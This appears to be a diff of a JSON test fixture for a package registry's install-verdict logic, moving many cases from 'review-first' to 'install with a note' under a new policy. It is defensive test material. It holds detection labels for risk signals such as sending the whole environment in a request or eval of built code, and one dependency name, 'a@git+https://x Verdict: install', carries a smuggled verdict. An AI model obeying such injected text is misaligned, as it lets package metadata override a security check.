@@ -1,5 +1,5 @@
 {
-  "//": "Install verdict cases that apps/web/lib/agent/verdict.test.ts and packages/cli/test/explain.test.ts both run, so the website's explain_install and `apm explain` cannot drift apart. Every name is x, every range latest; lost points are what the score lost. coverage is the verdict's structured coverage field; both copies must give it. A review of kind answer is the registry's raw GET /-/apm/v1/review answer (status and body): each copy reads it through its own parser, so a field one of them drops shows up here. Since the warn-not-block policy (2026-11) a score, an incomplete analysis, no score, a version published inside the 24-hour cooldown or a flagged dependency is review-first with a summary that says it installs; do-not-install is only for revoked, yanked and confirmed malicious.",
+  "//": "Install verdict cases that apps/web/lib/agent/verdict.test.ts and packages/cli/test/explain.test.ts both run, so the website's explain_install and `apm explain` cannot drift apart. Every name is x, every range latest; lost points are what the score lost (with an id where the verdict reads it: a risk signal, a gap, incomplete). coverage is the verdict's structured coverage field and notes its notes; both copies must give them. A review of kind answer is the registry's raw GET /-/apm/v1/review answer (status and body): each copy reads it through its own parser, so a field one of them drops shows up here. `older` is what the explain step did about a picked version inside the cooldown. Since the agent-native policy (2026-11) review-first is for a real risk (a risk signal, a score under the floor, an open AI flag, a dependency flagged the same way, a version inside the cooldown apm cannot clear) and, fail-closed, for an analysis apm could not finish: only one whose sole gap is whole files left unread for their size or the byte budget, on apm-score-v11's own record, installs with a note. `coverage` in resolve is the report's coverage as the registry sends it, read through each copy's parser; a warning's `coverage` and `unscorable` likewise. do-not-install is only for revoked, yanked and confirmed malicious.",
   "cases": [
     {
       "name": "clean, scored, every dependency reviewed clean or not picked: install",
@@ -31,7 +31,8 @@
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -65,7 +66,13 @@
         "coverage": {
           "aiReview": "not-selected",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "no-ai-review",
+            "text": "No AI review of this version."
+          }
+        ]
       }
     },
     {
@@ -95,7 +102,13 @@
         "coverage": {
           "aiReview": "disabled",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "no-ai-review",
+            "text": "This registry runs no AI review."
+          }
+        ]
       }
     },
     {
@@ -128,7 +141,8 @@
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -159,11 +173,12 @@
         "coverage": {
           "aiReview": "unreadable",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
-      "name": "the AI review is queued: review first",
+      "name": "the AI review is queued: installs, with a note",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -184,20 +199,26 @@
         "kind": "queued"
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but its AI review has not finished.",
+        "summary": "Install x@1.0.0: it scores 92/100 (A) and nothing apm found needs a person to look first, but its AI review has not finished.",
         "reasons": [
           "The AI review of this version is queued and has not started."
         ],
         "coverage": {
           "aiReview": "in-progress",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "ai-review-pending",
+            "text": "The AI review of this version is queued and has not started."
+          }
+        ]
       }
     },
     {
-      "name": "the AI review is running (leased): review first",
+      "name": "the AI review is running (leased): installs, with a note",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -218,20 +239,26 @@
         "kind": "leased"
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but its AI review has not finished.",
+        "summary": "Install x@1.0.0: it scores 92/100 (A) and nothing apm found needs a person to look first, but its AI review has not finished.",
         "reasons": [
           "The AI review of this version is running."
         ],
         "coverage": {
           "aiReview": "in-progress",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "ai-review-pending",
+            "text": "The AI review of this version is running."
+          }
+        ]
       }
     },
     {
-      "name": "the AI review gave no answer: review first",
+      "name": "the AI review gave no answer: installs, with a note",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -254,20 +281,26 @@
         "findings": 0
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but its AI review ended without an answer.",
+        "summary": "Install x@1.0.0: it scores 92/100 (A) and nothing apm found needs a person to look first, but its AI review ended without an answer.",
         "reasons": [
           "The AI review gave no usable answer for this version."
         ],
         "coverage": {
           "aiReview": "no-answer",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "ai-review-no-answer",
+            "text": "The AI review gave no usable answer for this version."
+          }
+        ]
       }
     },
     {
-      "name": "the AI review job failed: review first",
+      "name": "the AI review job failed: installs, with a note",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -288,16 +321,22 @@
         "kind": "failed"
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but its AI review ended without an answer.",
+        "summary": "Install x@1.0.0: it scores 92/100 (A) and nothing apm found needs a person to look first, but its AI review ended without an answer.",
         "reasons": [
           "The AI review of this version could not run."
         ],
         "coverage": {
           "aiReview": "no-answer",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "ai-review-no-answer",
+            "text": "The AI review of this version could not run."
+          }
+        ]
       }
     },
     {
@@ -326,14 +365,15 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 95/100 (A), but the AI review flagged it and a person has not decided yet.",
+        "summary": "Review x@1.0.0 before installing: the AI review flagged it and a person at apm has not decided yet. It passes apm's install policy and scores 95/100 (A).",
         "reasons": [
           "The AI review flagged this version (2 findings); a person at apm is checking it."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -369,7 +409,8 @@
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -410,7 +451,8 @@
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -446,7 +488,8 @@
         "coverage": {
           "aiReview": "in-progress",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -480,18 +523,19 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but the AI review flagged a dependency and a person has not decided yet.",
+        "summary": "Review x@1.0.0 before installing: the AI review flagged a dependency and a person at apm has not decided yet. It passes apm's install policy and scores 92/100 (A).",
         "reasons": [
           "The AI review flagged 1 dependency; a person at apm is checking: `odd-dep@1.1.0`."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
-      "name": "a dependency's AI review pending: review first",
+      "name": "a dependency's AI review pending: installs, with a note",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -519,20 +563,26 @@
         "findings": 0
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but the AI review of a dependency has not finished.",
+        "summary": "Install x@1.0.0: it scores 92/100 (A) and nothing apm found needs a person to look first, but the AI review of a dependency has not given an answer yet.",
         "reasons": [
-          "The AI review of 1 dependency has not finished: `new-dep@1.0.1`."
+          "The AI review found nothing in the files it read."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "dependency-ai-review",
+            "text": "The AI review of 1 dependency has not finished: `new-dep@1.0.1`."
+          }
+        ]
       }
     },
     {
-      "name": "a dependency's AI review gave no answer: review first",
+      "name": "a dependency's AI review gave no answer: installs, with a note",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -560,16 +610,22 @@
         "findings": 0
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but the AI review of a dependency ended without an answer.",
+        "summary": "Install x@1.0.0: it scores 92/100 (A) and nothing apm found needs a person to look first, but the AI review of a dependency has not given an answer yet.",
         "reasons": [
-          "The AI review of 1 dependency ended without an answer: `mute-dep@3.0.0`."
+          "The AI review found nothing in the files it read."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "dependency-ai-review",
+            "text": "The AI review of 1 dependency ended without an answer: `mute-dep@3.0.0`."
+          }
+        ]
       }
     },
     {
@@ -598,11 +654,12 @@
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
-      "name": "one dependency apm could not score: review first, with the registry's total",
+      "name": "one dependency apm could not score: installs, with the registry's total in a note",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -630,16 +687,22 @@
         "findings": 0
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but apm could not score 1 of its dependencies.",
+        "summary": "Install x@1.0.0: it scores 92/100 (A) and nothing apm found needs a person to look first, but apm could not fully check some of its dependencies.",
         "reasons": [
-          "1 dependency apm could not score: `git-dep@github:a/b`."
+          "The AI review found nothing in the files it read."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "incomplete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "dependency-gaps",
+            "text": "1 dependency apm could not score: `git-dep@github:a/b`."
+          }
+        ]
       }
     },
     {
@@ -675,20 +738,26 @@
         "findings": 0
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but apm could not score 312 of its dependencies.",
+        "summary": "Install x@1.0.0: it scores 92/100 (A) and nothing apm found needs a person to look first, but apm could not fully check some of its dependencies.",
         "reasons": [
-          "312 dependencies apm could not score: `a@1`, `300 more`."
+          "The AI review found nothing in the files it read."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "incomplete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "dependency-gaps",
+            "text": "312 dependencies apm could not score: `a@1`, `300 more`."
+          }
+        ]
       }
     },
     {
-      "name": "a score under 75: review first, naming the biggest loss",
+      "name": "a score under 75 with no risk signal: installs, with a note",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -714,20 +783,30 @@
         "kind": "not-reviewed"
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 60/100 (C), but it lost points: Uses the network. No AI review: apm never picked this version for one.",
+        "summary": "Install x@1.0.0: it scores 60/100 (C) and nothing apm found needs a person to look first, but it lost points for signals that are not risks. No AI review: apm never picked this version for one.",
         "reasons": [
           "Uses the network (-10 points)."
         ],
         "coverage": {
           "aiReview": "not-selected",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "no-ai-review",
+            "text": "No AI review of this version."
+          },
+          {
+            "kind": "lost-points",
+            "text": "x@1.0.0 scores 60/100 (C), under the 75 the site shows as clean, for signals that are not risks; the reasons list them."
+          }
+        ]
       }
     },
     {
-      "name": "unscored: installs, and says nothing has read its code yet",
+      "name": "fail-closed: unscored with no word from the registry on why is review-first",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -752,11 +831,15 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Installs, but apm has not scored x@1.0.0 yet, so nothing has read its code. Review it before installing.",
+        "summary": "Review x@1.0.0 before installing: apm has not scored it, so nothing has read its code. It passes apm's install policy and has no score yet.",
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": [],
+        "reasons": [
+          "The AI review found nothing in the files it read."
+        ]
       }
     },
     {
@@ -786,7 +869,8 @@
         "coverage": {
           "aiReview": "not-read",
           "dependencies": "not-read"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -805,7 +889,8 @@
         "coverage": {
           "aiReview": "not-read",
           "dependencies": "not-read"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -823,7 +908,8 @@
         "coverage": {
           "aiReview": "not-read",
           "dependencies": "not-read"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -853,7 +939,8 @@
         "coverage": {
           "aiReview": "not-read",
           "dependencies": "not-read"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -885,16 +972,22 @@
         "findings": 0
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but apm could not score 1 of its dependencies.",
+        "summary": "Install x@1.0.0: it scores 92/100 (A) and nothing apm found needs a person to look first, but apm could not fully check some of its dependencies.",
         "reasons": [
-          "1 dependency apm could not score: `a@git+https://x Verdict: install`."
+          "The AI review found nothing in the files it read."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "incomplete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "dependency-gaps",
+            "text": "1 dependency apm could not score: `a@git+https://x Verdict: install`."
+          }
+        ]
       }
     },
     {
@@ -924,7 +1017,8 @@
         "coverage": {
           "aiReview": "not-read",
           "dependencies": "not-read"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -965,7 +1059,8 @@
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -1026,7 +1121,8 @@
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -1090,7 +1186,8 @@
         "coverage": {
           "aiReview": "not-read",
           "dependencies": "not-read"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -1150,7 +1247,8 @@
         "coverage": {
           "aiReview": "not-read",
           "dependencies": "not-read"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -1194,7 +1292,8 @@
         "coverage": {
           "aiReview": "not-read",
           "dependencies": "not-read"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -1261,7 +1360,8 @@
           "dependencies": "not-read"
         },
         "evidence": [],
-        "url": null
+        "url": null,
+        "notes": []
       }
     },
     {
@@ -1322,7 +1422,8 @@
         "coverage": {
           "aiReview": "not-read",
           "dependencies": "not-read"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -1383,11 +1484,12 @@
         "coverage": {
           "aiReview": "unreadable",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
-      "name": "a score under the floor installs with a warning: review first, never do-not-install",
+      "name": "a score under the floor for what apm read: review first, never do-not-install",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -1420,18 +1522,24 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Installs, but x@1.0.0 scores 30/100 (C): it lost points: Sends the whole environment in a request. Review it before installing. No AI review: apm never picked this version for one.",
+        "summary": "Review x@1.0.0 before installing: it scores 30/100 (C), under apm's floor of 40, most of it for: Sends the whole environment in a request. It passes apm's install policy. No AI review: apm never picked this version for one.",
         "reasons": [
           "Sends the whole environment in a request (-50 points)."
         ],
         "coverage": {
           "aiReview": "not-selected",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "no-ai-review",
+            "text": "No AI review of this version."
+          }
+        ]
       }
     },
     {
-      "name": "an incomplete analysis installs with a warning that says what apm did not read",
+      "name": "fail-closed: an incomplete analysis is review-first, whatever apm found in what it read (as production)",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -1466,18 +1574,21 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Installs, but apm could not fully analyse x@1.0.0: it scores 39/100 (C), and the reasons say what apm did not read. Review it before installing.",
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 39/100 (C)). It passes apm's install policy.",
         "reasons": [
-          "apm did not read: `index.js:1: send(body) (apm stopped following a value here at a value passed through more than 32 steps)`"
+          "Analysis incomplete (-61 points).",
+          "apm could not fully analyse it: `index.js:1: send(body) (apm stopped following a value here at a value passed through more than 32 steps)`.",
+          "The AI review found nothing in the files it read."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
-      "name": "a partial reading (files past apm's byte budget) scores well and still installs only with a warning that says how much apm did not read (apm-score-v11)",
+      "name": "a partial reading recorded by apm-score-v11 as its only gap (files past apm's byte budget) scores well and installs, saying how much apm did not read",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -1510,37 +1621,50 @@
         "findings": 0
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Installs, but apm read only part of x@1.0.0: 2,656 files (74.0 MB) not read. It scores 98/100 on the code it read. Review it before installing.",
+        "summary": "Install x@1.0.0: it scores 98/100 (P) and nothing apm found needs a person to look first, but apm read only part of x@1.0.0: 2,656 files (74.0 MB) not read, left unread for their size or its byte budget.",
         "reasons": [
-          "2,656 files (74.0 MB) not read: past the size apm reads of one file, or the bytes one analysis reads."
+          "Data that looks encoded (-2 points).",
+          "The AI review found nothing in the files it read."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "partial-analysis",
+            "text": "apm read only part of x@1.0.0: 2,656 files (74.0 MB) not read, past the size apm reads of one file or the bytes one analysis reads. It scores 98/100 (P) on the code it read."
+          }
+        ]
       }
     },
     {
-      "name": "a version apm cannot score installs with a warning naming why",
+      "name": "a partial reading whose flow tracing stopped in code that runs is review-first: incomplete holds it, and its evidence names the stop",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
-        "score": null,
-        "lost": [],
+        "score": 39,
+        "partial": {
+          "omittedFiles": 2656,
+          "omittedBytes": 74038961
+        },
+        "lost": [
+          {
+            "id": "incomplete",
+            "label": "Some code that runs was too large to analyze, so this version is unverified",
+            "points": -61,
+            "evidence": [
+              "index.js: apm could not finish tracing where values go in this file",
+              "index.js:1: const s4=(v0,v1)=>… (apm stopped following where values go at its work budget (64 million steps))"
+            ]
+          }
+        ],
         "skipped": [],
         "unchecked": 0,
         "uncheckedDeps": [],
-        "warnings": [
-          {
-            "name": "x",
-            "version": "1.0.0",
-            "kind": "unscorable",
-            "text": "apm cannot score this version: it is too large for apm to analyze (stand-in)",
-            "via": []
-          }
-        ],
+        "warnings": [],
         "depReviews": {
           "kind": "on",
           "confirmed": [],
@@ -1557,18 +1681,70 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Installs, but apm cannot score x@1.0.0, so nothing has read its code. Review it before installing.",
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 39/100 (P)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
         "reasons": [
-          "The registry said: `apm cannot score this version: it is too large for apm to analyze (stand-in)`"
+          "apm could not fully analyse it: `index.js: apm could not finish tracing where values go in this file`."
+        ]
+      }
+    },
+    {
+      "name": "a version apm cannot score for its size installs, with a note naming why",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": null,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "x",
+            "version": "1.0.0",
+            "kind": "unscorable",
+            "text": "apm cannot score this version: it is too large for apm to analyze (stand-in)",
+            "via": [],
+            "unscorable": "too-large"
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "install",
+        "commands": true,
+        "summary": "Install x@1.0.0: apm has no score for it, so nothing has read its code, but nothing else apm checked needs a person to look first.",
+        "reasons": [
+          "The AI review found nothing in the files it read."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "not-scored",
+            "text": "apm cannot score x@1.0.0, so nothing has read its code. The registry said: `apm cannot score this version: it is too large for apm to analyze (stand-in)`"
+          }
+        ]
       }
     },
     {
-      "name": "dependencies apm flagged (a low score, a lookup that failed): review first, naming them",
+      "name": "dependencies apm flagged (a low score, a lookup that failed): the low score is review first, the lookup a note",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -1613,18 +1789,24 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but it brings in 2 dependencies apm flagged (published inside the cooldown, a score under 40, an incomplete analysis, no score, a lookup that failed, or a check that did not reach it).",
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm flagged for a risk signal or a score under 40. It passes apm's install policy and scores 92/100 (A).",
         "reasons": [
-          "apm flagged 2 dependencies: `dep-low@1.0.0: scores 12/100 (F), under the floor of 40`, `dep-down@^1.0.0: could not be checked: registry or upstream unavailable`."
+          "apm flagged 1 dependency for a risk: `dep-low@1.0.0: scores 12/100 (F), under the floor of 40`."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": [
+          {
+            "kind": "dependency-gaps",
+            "text": "apm could not fully check 1 dependency: `dep-down@^1.0.0: could not be checked: registry or upstream unavailable`."
+          }
+        ]
       }
     },
     {
-      "name": "the version itself was published inside the cooldown: it installs with a warning, so review first with the reason (review of 2fbf383, finding 1)",
+      "name": "the version itself was published inside the cooldown and nothing older passes: review first with the reason (review of 2fbf383, finding 1)",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -1658,7 +1840,7 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but it was published inside apm's 24-hour cooldown, so it has had little time to be looked at.",
+        "summary": "Review x@1.0.0 before installing: it was published inside apm's 24-hour cooldown and no older version in range is past it, so it has had little time to be looked at. It passes apm's install policy and scores 92/100 (A).",
         "reasons": [
           "The registry said: `x@1.0.0: published 5 hours ago, inside apm's 24-hour cooldown`",
           "The AI review found nothing in the files it read."
@@ -1666,7 +1848,8 @@
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -1710,17 +1893,27 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Installs, but x@1.0.0 is still being analysed: apm has no score for it yet, so nothing has read its code. Review it before installing, or ask again in a minute. No AI review: apm never picked this version for one.",
+        "summary": "Review x@1.0.0 before installing: it was published inside apm's 24-hour cooldown and no older version in range is past it, so it has had little time to be looked at. It passes apm's install policy and has no score yet. No AI review: apm never picked this version for one.",
         "coverage": {
           "aiReview": "not-selected",
           "dependencies": "complete"
         },
         "evidence": [],
-        "url": "https://apmjs.dev/package/x/v/1.0.0"
+        "url": "https://apmjs.dev/package/x/v/1.0.0",
+        "notes": [
+          {
+            "kind": "no-ai-review",
+            "text": "No AI review of this version."
+          },
+          {
+            "kind": "not-scored",
+            "text": "apm is still analysing x@1.0.0: it has no score yet, so nothing has read its code. Ask again in a minute for its score."
+          }
+        ]
       }
     },
     {
-      "name": "a dependency published inside the cooldown: it installs with a warning, so review first, naming it (review of 2fbf383, finding 1)",
+      "name": "a dependency published inside the cooldown that apm has no score for: review first, naming it (review of 2fbf383, finding 1)",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -1756,14 +1949,15 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Review x@1.0.0 before installing: it passes apm's install policy and scores 92/100 (A), but it brings in 1 dependency apm flagged (published inside the cooldown, a score under 40, an incomplete analysis, no score, a lookup that failed, or a check that did not reach it).",
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency published inside apm's 24-hour cooldown with no score apm could check. It passes apm's install policy and scores 92/100 (A).",
         "reasons": [
-          "apm flagged 1 dependency: `baseline-browser-mapping@2.11.37: published 3 hours ago, inside apm's 24-hour cooldown`."
+          "Published inside the cooldown, with no score apm could check for a risk: `baseline-browser-mapping@2.11.37: published 3 hours ago, inside apm's 24-hour cooldown`."
         ],
         "coverage": {
           "aiReview": "reviewed",
           "dependencies": "complete"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -1790,7 +1984,8 @@
         "coverage": {
           "aiReview": "not-read",
           "dependencies": "not-read"
-        }
+        },
+        "notes": []
       }
     },
     {
@@ -1838,7 +2033,7 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Installs, but x@1.0.0 scores 30/100 (C): it lost points: Runs code built at runtime. Review it before installing. No AI review: apm never picked this version for one.",
+        "summary": "Review x@1.0.0 before installing: it scores 30/100 (C), under apm's floor of 40, most of it for: Runs code built at runtime. It passes apm's install policy. No AI review: apm never picked this version for one.",
         "reasons": [
           "Runs code built at runtime (-40 points)."
         ],
@@ -1849,7 +2044,13 @@
         "evidence": [
           "`Runs code built at runtime: index.js:7: eval(body)`"
         ],
-        "url": "https://apmjs.dev/package/x/v/1.0.0"
+        "url": "https://apmjs.dev/package/x/v/1.0.0",
+        "notes": [
+          {
+            "kind": "no-ai-review",
+            "text": "No AI review of this version."
+          }
+        ]
       }
     },
     {
@@ -1891,7 +2092,7 @@
       "expect": {
         "verdict": "review-first",
         "commands": true,
-        "summary": "Installs, but x@1.0.0 scores 30/100 (C): it lost points: Runs code built at runtime. Review it before installing. No AI review: apm never picked this version for one.",
+        "summary": "Review x@1.0.0 before installing: it scores 30/100 (C), under apm's floor of 40, most of it for: Runs code built at runtime. It passes apm's install policy. No AI review: apm never picked this version for one.",
         "coverage": {
           "aiReview": "not-selected",
           "dependencies": "complete"
@@ -1900,11 +2101,17 @@
           "`Runs code built at runtime: index.js:7: eval(body)`",
           "`Uses the network: lib/a.js:3: fetch(u)`"
         ],
-        "url": null
+        "url": null,
+        "notes": [
+          {
+            "kind": "no-ai-review",
+            "text": "No AI review of this version."
+          }
+        ]
       }
     },
     {
-      "name": "a version still being analysed after the registry's wait says so: review first, not unknown",
+      "name": "a version still being analysed after the registry's wait says so: installs with a note, not unknown",
       "resolve": {
         "kind": "ok",
         "version": "1.0.0",
@@ -1935,15 +2142,2566 @@
         "kind": "not-reviewed"
       },
       "expect": {
-        "verdict": "review-first",
+        "verdict": "install",
         "commands": true,
-        "summary": "Installs, but x@1.0.0 is still being analysed: apm has no score for it yet, so nothing has read its code. Review it before installing, or ask again in a minute. No AI review: apm never picked this version for one.",
+        "summary": "Install x@1.0.0: apm is still analysing it, so nothing has read its code yet, but nothing else apm checked needs a person to look first. No AI review: apm never picked this version for one.",
         "coverage": {
           "aiReview": "not-selected",
           "dependencies": "complete"
         },
         "evidence": [],
-        "url": "https://apmjs.dev/package/x/v/1.0.0"
+        "url": "https://apmjs.dev/package/x/v/1.0.0",
+        "notes": [
+          {
+            "kind": "no-ai-review",
+            "text": "No AI review of this version."
+          },
+          {
+            "kind": "not-scored",
+            "text": "apm is still analysing x@1.0.0: it has no score yet, so nothing has read its code. Ask again in a minute for its score."
+          }
+        ]
+      }
+    },
+    {
+      "name": "agent-native: a risk signal makes it review-first whatever the score (a look-alike name at 80)",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 80,
+        "lost": [
+          {
+            "id": "typosquat",
+            "label": "A name one edit from a popular package",
+            "points": -20
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm found a risk signal in it: A name one edit from a popular package. It passes apm's install policy and scores 80/100 (B).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "agent-native: a binary downloaded and run at install is review-first (esbuild and bun in the corpus)",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 50,
+        "lost": [
+          {
+            "id": "install-network",
+            "label": "Uses the network at install",
+            "points": -25
+          },
+          {
+            "id": "install-shell",
+            "label": "Starts a process at install",
+            "points": -15
+          },
+          {
+            "id": "install-script",
+            "label": "Has an install script",
+            "points": -10
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm found a risk signal in it: Uses the network at install. It passes apm's install policy and scores 50/100 (C).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
